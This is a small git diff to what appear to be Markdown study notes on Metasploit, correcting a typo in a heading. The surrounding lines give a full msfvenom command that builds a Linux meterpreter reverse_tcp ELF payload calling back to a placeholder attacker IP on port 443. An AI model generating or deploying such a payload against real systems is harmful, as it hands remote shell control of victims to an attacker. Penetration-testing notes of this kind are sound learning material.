@@ -72,6 +72,6 @@ Aside from the **msfconsole** man page, the other important thing to note when w
 - msfvenom --list payloads
 
 -----
-Example liunx everse shell for meterpreter - 
+Example liunx reverse shell for meterpreter - 
 
 - msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST={MY IP ADDRESS} LPORT=443
